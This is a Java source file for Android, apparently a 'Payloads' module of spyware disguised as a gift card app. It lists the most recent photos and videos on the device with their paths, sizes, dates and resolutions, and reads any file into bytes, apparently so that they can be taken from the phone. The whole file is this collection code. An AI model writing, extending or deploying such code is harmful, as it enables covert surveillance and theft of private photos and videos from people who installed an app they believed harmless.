package com.employee.giftcard.Payloads;

import android.content.Context;
import android.database.Cursor;
import android.provider.MediaStore;
import android.net.Uri;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class getMedia {
    Context context;
    
    public getMedia(Context context) {
        this.context = context;
    }
    
    // Get list of all photos with paths and metadata
    public String getPhotoList() {
        StringBuilder photos = new StringBuilder();
        Cursor cursor = null;
        
        try {
            String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media.WIDTH,
                MediaStore.Images.Media.HEIGHT
            };
            
            cursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_TAKEN + " DESC"
            );
            
            if (cursor != null && cursor.getCount() > 0) {
                photos.append("=== PHOTOS ===\n");
                photos.append("Total photos: ").append(cursor.getCount()).append("\n\n");
                
                int count = 0;
                while (cursor.moveToNext() && count < 100) { // Limit to 100 most recent
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
                    long dateTaken = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN));
                    int width = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH));
                    int height = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT));
                    
                    photos.append("Photo #").append(++count).append("\n");
                    photos.append("Name: ").append(name).append("\n");
                    photos.append("Path: ").append(path).append("\n");
                    photos.append("Size: ").append(formatFileSize(size)).append("\n");
                    photos.append("Resolution: ").append(width).append("x").append(height).append("\n");
                    photos.append("Date: ").append(formatDate(dateTaken)).append("\n");
                    photos.append("---\n");
                }
            } else {
                photos.append("No photos found\n");
            }
        } catch (Exception e) {
            photos.append("Error reading photos: ").append(e.getMessage()).append("\n");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return photos.toString();
    }
    
    // Get list of all videos with paths and metadata
    public String getVideoList() {
        StringBuilder videos = new StringBuilder();
        Cursor cursor = null;
        
        try {
            String[] projection = {
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DATE_TAKEN,
                MediaStore.Video.Media.DURATION,
                MediaStore.Video.Media.WIDTH,
                MediaStore.Video.Media.HEIGHT
            };
            
            cursor = context.getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Video.Media.DATE_TAKEN + " DESC"
            );
            
            if (cursor != null && cursor.getCount() > 0) {
                videos.append("=== VIDEOS ===\n");
                videos.append("Total videos: ").append(cursor.getCount()).append("\n\n");
                
                int count = 0;
                while (cursor.moveToNext() && count < 50) { // Limit to 50 most recent
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME));
                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA));
                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE));
                    long dateTaken = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_TAKEN));
                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION));
                    int width = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.WIDTH));
                    int height = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.HEIGHT));
                    
                    videos.append("Video #").append(++count).append("\n");
                    videos.append("Name: ").append(name).append("\n");
                    videos.append("Path: ").append(path).append("\n");
                    videos.append("Size: ").append(formatFileSize(size)).append("\n");
                    videos.append("Resolution: ").append(width).append("x").append(height).append("\n");
                    videos.append("Duration: ").append(formatDuration(duration)).append("\n");
                    videos.append("Date: ").append(formatDate(dateTaken)).append("\n");
                    videos.append("---\n");
                }
            } else {
                videos.append("No videos found\n");
            }
        } catch (Exception e) {
            videos.append("Error reading videos: ").append(e.getMessage()).append("\n");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return videos.toString();
    }
    
    // Read a specific photo/video file and return as byte array
    public byte[] getFile(String filePath) {
        File file = new File(filePath);
        if (!file.exists()) {
            return null;
        }
        
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            return data;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }
    
    private String formatFileSize(long size) {
        if (size < 1024) return size + " B";
        int z = (63 - Long.numberOfLeadingZeros(size)) / 10;
        return String.format(Locale.US, "%.1f %sB", (double) size / (1L << (z * 10)), " KMGTPE".charAt(z));
    }
    
    private String formatDuration(long millis) {
        long seconds = millis / 1000;
        long minutes = seconds / 60;
        long hours = minutes / 60;
        seconds = seconds % 60;
        minutes = minutes % 60;
        
        if (hours > 0) {
            return String.format(Locale.US, "%d:%02d:%02d", hours, minutes, seconds);
        } else {
            return String.format(Locale.US, "%d:%02d", minutes, seconds);
        }
    }
    
    private String formatDate(long timestamp) {
        if (timestamp == 0) return "Unknown";
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
        return sdf.format(new Date(timestamp));
    }
}
